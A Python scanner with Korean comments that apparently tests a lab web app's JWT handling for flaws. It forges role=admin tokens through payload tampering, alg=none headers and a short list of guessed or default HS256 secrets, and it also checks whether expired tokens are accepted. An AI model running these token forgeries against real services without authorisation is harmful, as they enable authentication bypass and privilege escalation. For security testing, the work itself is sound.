import base64
import json
import hmac
import hashlib
import time
import requests
from datetime import datetime


TEST_USERNAME = "alice"
TEST_PASSWORD = "alice1234"

# auth.py에 기본값으로 들어가 있는 SECRET_KEY 후보
SECRET_CANDIDATES = [
    "supersecret_do_not_change",
    "secret",
    "admin",
    "password",
    "jwtsecret",
    "changeme"
]

# JWT 검증이 필요한 일반 보호 API
# /admin/* 는 현재 인증 자체가 없어서 JWT 취약점 판별용으로 쓰면 BFLA와 섞입니다.
PROTECTED_ENDPOINT = "/accounts/my"


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")


def b64url_decode(data: str) -> bytes:
    padding = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode((data + padding).encode("utf-8"))


def decode_jwt_payload(token: str) -> dict:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return {}
        payload_raw = b64url_decode(parts[1])
        return json.loads(payload_raw.decode("utf-8"))
    except Exception:
        return {}


def make_none_alg_token(payload: dict) -> str:
    header = {
        "alg": "none",
        "typ": "JWT"
    }

    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))

    # alg=none 토큰은 서명부를 비워둡니다.
    return f"{header_b64}.{payload_b64}."


def make_hs256_token(payload: dict, secret: str) -> str:
    header = {
        "alg": "HS256",
        "typ": "JWT"
    }

    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))

    signing_input = f"{header_b64}.{payload_b64}".encode("utf-8")
    signature = hmac.new(
        secret.encode("utf-8"),
        signing_input,
        hashlib.sha256
    ).digest()

    signature_b64 = b64url_encode(signature)

    return f"{header_b64}.{payload_b64}.{signature_b64}"


def tamper_payload_keep_signature(token: str, update_data: dict) -> str:
    """
    기존 JWT payload만 바꾸고, 기존 signature는 그대로 유지합니다.
    서버가 서명 검증을 제대로 한다면 이 토큰은 거부되어야 합니다.
    """
    parts = token.split(".")
    if len(parts) != 3:
        return token

    header_b64, payload_b64, signature_b64 = parts

    payload = decode_jwt_payload(token)
    payload.update(update_data)

    new_payload_b64 = b64url_encode(
        json.dumps(payload, separators=(",", ":")).encode("utf-8")
    )

    return f"{header_b64}.{new_payload_b64}.{signature_b64}"


def get_token(base_url, username=TEST_USERNAME, password=TEST_PASSWORD):
    resp = requests.post(
        f"{base_url}/auth/login",
        json={
            "username": username,
            "password": password
        },
        timeout=5
    )

    if resp.status_code == 200:
        data = resp.json()
        return data["access_token"], data.get("user", {})

    raise Exception(f"로그인 실패: {resp.status_code} / {resp.text[:200]}")


def request_with_token(base_url, endpoint, token):
    headers = {
        "Authorization": f"Bearer {token}"
    }

    return requests.get(
        f"{base_url}{endpoint}",
        headers=headers,
        timeout=5
    )


def is_success(resp):
    return 200 <= resp.status_code < 300


def safe_preview(resp):
    try:
        return json.dumps(resp.json(), ensure_ascii=False)[:200]
    except Exception:
        return resp.text[:200]


def jwt_check(base_url):
    result = {
        "scan_id": "JWT",
        "target": base_url,
        "scan_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "vulnerabilities": []
    }

    try:
        token, user = get_token(base_url)
    except Exception as e:
        result["error"] = str(e)
        return result

    payload = decode_jwt_payload(token)

    # JWT-001: JWT Payload에 권한 정보(role)가 포함되어 있는지 확인
    has_role_claim = "role" in payload

    result["vulnerabilities"].append({
        "id": "JWT-001",
        "type": "JWT",
        "severity": "Medium",
        "status": "취약" if has_role_claim else "양호",
        "owasp": "A01:2021 - Broken Access Control",
        "endpoint": "/auth/login",
        "payload": "JWT payload 확인",
        "detected_keywords": ["role"] if has_role_claim else [],
        "evidence": f"JWT payload에 role={payload.get('role')} 포함" if has_role_claim else "JWT payload에 role claim 없음",
        "description": "JWT payload에 role 권한 정보가 포함되어 있음 — 서버가 DB 재조회 없이 role claim만 신뢰하면 권한 상승 가능"
    })

    # 이후 테스트용 payload 구성
    forged_payload = payload.copy()
    forged_payload["role"] = "admin"
    forged_payload["exp"] = int(time.time()) + 3600

    # JWT-002: payload만 변조하고 서명은 그대로 둔 토큰 허용 여부
    tampered_token = tamper_payload_keep_signature(token, {"role": "admin"})
    try:
        resp = request_with_token(base_url, PROTECTED_ENDPOINT, tampered_token)
        accepted = is_success(resp)

        result["vulnerabilities"].append({
            "id": "JWT-002",
            "type": "JWT",
            "severity": "Critical",
            "status": "취약" if accepted else "양호",
            "owasp": "A01:2021 - Broken Access Control",
            "endpoint": PROTECTED_ENDPOINT,
            "payload": "JWT payload role=admin 변조, 기존 signature 재사용",
            "detected_keywords": ["role", "admin"],
            "evidence": f"응답코드={resp.status_code}, 응답={safe_preview(resp)}",
            "description": "JWT payload만 변조한 토큰이 허용됨 — 서버가 JWT 서명 검증을 제대로 하지 않을 가능성"
        })
    except Exception as e:
        result["vulnerabilities"].append({
            "id": "JWT-002",
            "type": "JWT",
            "severity": "Low",
            "status": "점검실패",
            "owasp": "A01:2021 - Broken Access Control",
            "endpoint": PROTECTED_ENDPOINT,
            "payload": "JWT payload 변조",
            "detected_keywords": [],
            "evidence": str(e),
            "description": "payload 변조 토큰 테스트 중 오류 발생"
        })

    # JWT-003: alg=none 토큰 허용 여부
    none_token = make_none_alg_token(forged_payload)
    try:
        resp = request_with_token(base_url, PROTECTED_ENDPOINT, none_token)
        accepted = is_success(resp)

        result["vulnerabilities"].append({
            "id": "JWT-003",
            "type": "JWT",
            "severity": "Critical",
            "status": "취약" if accepted else "양호",
            "owasp": "A01:2021 - Broken Access Control",
            "endpoint": PROTECTED_ENDPOINT,
            "payload": "alg=none, role=admin",
            "detected_keywords": ["alg", "none"],
            "evidence": f"응답코드={resp.status_code}, 응답={safe_preview(resp)}",
            "description": "alg=none 토큰이 허용됨 — 공격자가 서명 없이 임의 payload를 넣어 인증 우회 가능"
        })
    except Exception as e:
        result["vulnerabilities"].append({
            "id": "JWT-003",
            "type": "JWT",
            "severity": "Low",
            "status": "점검실패",
            "owasp": "A01:2021 - Broken Access Control",
            "endpoint": PROTECTED_ENDPOINT,
            "payload": "alg=none",
            "detected_keywords": [],
            "evidence": str(e),
            "description": "alg=none 테스트 중 오류 발생"
        })

    # JWT-004: 약한 SECRET_KEY / 기본 SECRET_KEY 사용 여부
    found_secret = None
    found_resp = None

    for secret in SECRET_CANDIDATES:
        forged_token = make_hs256_token(forged_payload, secret)
        try:
            resp = request_with_token(base_url, PROTECTED_ENDPOINT, forged_token)
            if is_success(resp):
                found_secret = secret
                found_resp = resp
                break
        except Exception:
            continue

    if found_secret:
        result["vulnerabilities"].append({
            "id": "JWT-004",
            "type": "JWT",
            "severity": "Critical",
            "status": "취약",
            "owasp": "A02:2021 - Cryptographic Failures",
            "endpoint": PROTECTED_ENDPOINT,
            "payload": f"기본/약한 SECRET_KEY 후보로 HS256 JWT 재서명",
            "detected_keywords": ["HS256", "SECRET_KEY"],
            "evidence": f"SECRET_KEY 후보 '{found_secret}' 로 서명한 토큰 허용, 응답코드={found_resp.status_code}",
            "description": "예측 가능한 JWT SECRET_KEY 사용 — 공격자가 role=admin 토큰을 직접 재서명하여 인증 우회 가능"
        })
    else:
        result["vulnerabilities"].append({
            "id": "JWT-004",
            "type": "JWT",
            "severity": "Low",
            "status": "양호",
            "owasp": "A02:2021 - Cryptographic Failures",
            "endpoint": PROTECTED_ENDPOINT,
            "payload": "기본/약한 SECRET_KEY 후보 테스트",
            "detected_keywords": [],
            "evidence": "기본 SECRET_KEY 후보로 서명한 토큰이 허용되지 않음",
            "description": "현재 테스트한 기본 SECRET_KEY 후보로는 JWT 재서명 우회가 확인되지 않음"
        })

    # JWT-005: 만료된 토큰 허용 여부
    if found_secret:
        expired_payload = payload.copy()
        expired_payload["exp"] = int(time.time()) - 3600

        expired_token = make_hs256_token(expired_payload, found_secret)

        try:
            resp = request_with_token(base_url, PROTECTED_ENDPOINT, expired_token)
            accepted = is_success(resp)

            result["vulnerabilities"].append({
                "id": "JWT-005",
                "type": "JWT",
                "severity": "High",
                "status": "취약" if accepted else "양호",
                "owasp": "A07:2021 - Identification and Authentication Failures",
                "endpoint": PROTECTED_ENDPOINT,
                "payload": "만료된 exp 값을 가진 JWT",
                "detected_keywords": ["exp"],
                "evidence": f"응답코드={resp.status_code}, 응답={safe_preview(resp)}",
                "description": "만료된 JWT가 허용됨 — 서버가 exp 만료 시간을 검증하지 않을 가능성"
            })
        except Exception as e:
            result["vulnerabilities"].append({
                "id": "JWT-005",
                "type": "JWT",
                "severity": "Low",
                "status": "점검실패",
                "owasp": "A07:2021 - Identification and Authentication Failures",
                "endpoint": PROTECTED_ENDPOINT,
                "payload": "만료 토큰",
                "detected_keywords": [],
                "evidence": str(e),
                "description": "만료 토큰 테스트 중 오류 발생"
            })

    return result


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        target = input("대상 URL 입력: ").strip()
    else:
        target = sys.argv[1]

    print(json.dumps(jwt_check(target), ensure_ascii=False, indent=2))